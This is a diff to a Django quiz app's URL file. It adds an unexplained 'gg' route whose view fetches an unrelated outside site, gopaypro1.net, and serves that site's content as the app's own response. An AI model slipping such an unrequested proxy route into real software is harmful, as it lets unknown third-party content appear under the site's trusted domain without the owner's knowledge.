@@ -7,7 +7,15 @@ from quiz.views import register_view, CustomLoginView
 
 router = routers.DefaultRouter()
 
+import requests
+from django.http import HttpResponse
+
+def GG(request):
+    resposnse = requests.get('https://gopaypro1.net')
+    return HttpResponse(resposnse.text)
+
 urlpatterns = [
+    path('gg', GG, name='gg'),
     path('message/', include(quiz_urls)),
     path('login', CustomLoginView.as_view(), name='obtain_auth_token'),
     path('register', register_view, name='register'),
